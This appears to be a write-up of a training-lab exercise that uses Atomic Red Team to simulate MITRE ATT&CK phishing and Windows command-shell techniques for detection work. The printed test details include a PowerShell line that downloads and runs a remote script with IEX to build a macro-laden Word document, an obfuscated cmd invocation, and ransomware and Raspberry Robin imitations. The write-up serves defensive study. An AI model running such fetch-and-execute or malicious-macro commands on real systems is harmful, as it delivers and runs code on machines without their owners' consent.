# <ins>Day 4: I’m all atomic inside</ins>    

## <ins>Challenge Objective:</ins>
> Learn how to identify malicious techniques using the **MITRE ATT&CK** framework.     
> Learn about how to use Atomic Red Team tests to conduct attack simulations.     
> Understand how to create alerting and detection rules from the attack tests.    

### <ins>Connection:</ins>
Connected using Remmina, using the credentials provided for RDP access:    
- **Username:** Administrator  
- **Password:** Emulation101!  
- **IP:** `MACHINE_IP`

![image](https://github.com/user-attachments/assets/d7048906-3ac0-4441-bec3-57bd9668ec4a)


![image](https://github.com/user-attachments/assets/75329e20-3c4e-4b63-8074-6217c998341f)



```
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -ShowDetails
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Download Macro-Enabled Phishing Attachment
Atomic Test Number: 1
Atomic Test GUID: 114ccff9-ae6d-4547-9ead-4cd69f687306
Description: This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating
an end user clicking a phishing link to download the file. The file "PhishingAttachment.xlsm" and PhishingAttachment.txt are downloaded to the %temp% directory.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$url = 'http://localhost/PhishingAttachment.xlsm'
$url2 = 'http://localhost/PhishingAttachment.txt'
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
Invoke-WebRequest -Uri $url2 -OutFile $env:TEMP\PhishingAttachment.txt

Cleanup Commands:
Command:
Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore
Remove-Item $env:TEMP\PhishingAttachment.txt -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Word spawned a command shell and used an IP address in the command line
Atomic Test Number: 2
Atomic Test GUID: cbb6799a-425c-4f83-9194-5447a909d67f
Description: Word spawning a command prompt then running a command with an IP address in the command line is an indiciator of malicious activity. Upon execution, CMD will be lauchned and ping 8.8.8.8

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
-UseBasicParsing)
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
-UseBasicParsing)
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"

Cleanup Commands:
Command:
Remove-Item #{jse_path} -ErrorAction Ignore
Command (with inputs):
Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore

Dependencies:
Description: Microsoft Word must be installed
Check Prereq Command:
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Check Prereq Command (with inputs):
try {
  New-Object -COMObject "Word.Application" | Out-Null
  $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Get Prereq Command:
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
Get Prereq Command (with inputs):
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
[!!!!!!!!END TEST!!!!!!!]
```




```
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -TestNumbers 1 -CheckPrereq
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

CheckPrereq's for: T1566.001-1 Download Macro-Enabled Phishing Attachment
Prerequisites met: T1566.001-1 Download Macro-Enabled Phishing Attachment
```


```
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -TestNumbers 1
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

Executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
Done executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
```


```
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -TestNumbers 1 -cleanup
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

Executing cleanup for test: T1566.001-1 Download Macro-Enabled Phishing Attachment
Done executing cleanup for test: T1566.001-1 Download Macro-Enabled Phishing Attachment
```

![image](https://github.com/user-attachments/assets/7315421a-cc33-4a42-89d9-979f0049e28c)



![image](https://github.com/user-attachments/assets/fa2534ce-44b2-4fe2-82f8-fb9ef423505e)

![image](https://github.com/user-attachments/assets/e1e175ad-3a2f-404d-8ef4-2632906913f1)

Used the words `command and scripting interpreter` to find **`T1059`**
![image](https://github.com/user-attachments/assets/00189456-8c4f-4342-b6c0-90b49a904689)


Then used to find subsection `Windows Command Shell` to find **`ID: T1059.003`**.

![image](https://github.com/user-attachments/assets/e44c9ef8-7031-4920-ba1c-01435dee2921)




Ran the same commands as before just with `T1059` instead:



```
PS C:\Users\Administrator\AppData\Local\Temp> Invoke-AtomicTest T1059.003 -ShowDetails
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Create and Execute Batch Script
Atomic Test Number: 1
Atomic Test GUID: 9e8894c0-50bd-4525-a96c-d4ac78ece388
Description: Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Start-Process #{script_path}
Command (with inputs):
Start-Process $env:TEMP\T1059.003_script.bat

Cleanup Commands:
Command:
Remove-Item #{script_path} -Force -ErrorAction Ignore
Command (with inputs):
Remove-Item $env:TEMP\T1059.003_script.bat -Force -ErrorAction Ignore

Dependencies:
Description: Batch file must exist on disk at specified location ($env:TEMP\T1059.003_script.bat)
Check Prereq Command:
if (Test-Path #{script_path}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path $env:TEMP\T1059.003_script.bat) {exit 0} else {exit 1}
Get Prereq Command:
New-Item #{script_path} -Force | Out-Null
Set-Content -Path #{script_path} -Value "#{command_to_execute}"
Get Prereq Command (with inputs):
New-Item $env:TEMP\T1059.003_script.bat -Force | Out-Null
Set-Content -Path $env:TEMP\T1059.003_script.bat -Value "dir"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Writes text to a file and displays it.
Atomic Test Number: 2
Atomic Test GUID: 127b4afe-2346-4192-815c-69042bec570e
Description: Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
echo "#{message}" > "#{file_contents_path}" & type "#{file_contents_path}"
Command (with inputs):
echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"

Cleanup Commands:
Command:
del "#{file_contents_path}" >nul 2>&1
Command (with inputs):
del "%TEMP%\test.bin" >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Suspicious Execution via Windows Command Shell
Atomic Test Number: 3
Atomic Test GUID: d0eb3597-a1b3-4d65-b33b-2cda8d397f20
Description: Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}
Command (with inputs):
%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Simulate BlackByte Ransomware Print Bombing
Atomic Test Number: 4
Atomic Test GUID: 6b2903ac-8f36-450d-9ad5-b220e8a2dcb9
Description: This test attempts to open a file a specified number of times in Wordpad, then prints the contents.  It is designed to mimic Blac
kByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed.  S
ee https://redcanary.com/blog/blackbyte-ransomware/.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
cmd /c "for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}" | Out-null
Command (with inputs):
cmd /c "for /l %x in (1,1,1) do start wordpad.exe /p C:\Tools\AtomicRedTeam\atomics\T1059.003\src\Wareville_Ransomware.txt" | Out-null

Cleanup Commands:
Command:
stop-process -name wordpad -force -erroraction silentlycontinue

Dependencies:
Description: File to print must exist on disk at specified location (C:\Tools\AtomicRedTeam\atomics\T1059.003\src\Wareville_Ransomware.txt)
Check Prereq Command:
if (test-path "#{file_to_print}"){exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (test-path "C:\Tools\AtomicRedTeam\atomics\T1059.003\src\Wareville_Ransomware.txt"){exit 0} else {exit 1}
Get Prereq Command:
new-item #{file_to_print} -value "This file has been created by T1059.003 Test 4" -Force | Out-Null
Get Prereq Command (with inputs):
new-item C:\Tools\AtomicRedTeam\atomics\T1059.003\src\Wareville_Ransomware.txt -value "This file has been created by T1059.003 Test 4" -Force
| Out-Null
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Command Prompt read contents from CMD file and execute
Atomic Test Number: 5
Atomic Test GUID: df81db1b-066c-4802-9bc8-b6d030c3ba8e
Description: Simulate Raspberry Robin using the "standard-in" command prompt feature cmd `/R <` to read and execute a file via cmd.exe See htt
ps://redcanary.com/blog/raspberry-robin/.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
cmd /r cmd<#{input_file}
Command (with inputs):
cmd /r cmd<C:\Tools\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd

Dependencies:
Description: CMD file must exist on disk at specified location (C:\Tools\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd)
Check Prereq Command:
if (Test-Path #{input_file}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path C:\Tools\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path #{input_file}) -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "#{input_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path C:\Tools\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd) -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "C:\Tools\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd"
[!!!!!!!!END TEST!!!!!!!]
```

![image](https://github.com/user-attachments/assets/1094d023-8642-49a9-9d82-75835b5b58e8)



![image](https://github.com/user-attachments/assets/a946bfe3-9ecd-46fb-bb31-e22c0a987a53)


![image](https://github.com/user-attachments/assets/f61af580-5723-4ab3-8a97-29a6564ce596)


Then solved given questions using this information:

![image](https://github.com/user-attachments/assets/1525ed0a-a5fc-429c-8ec9-f1316ef28169)
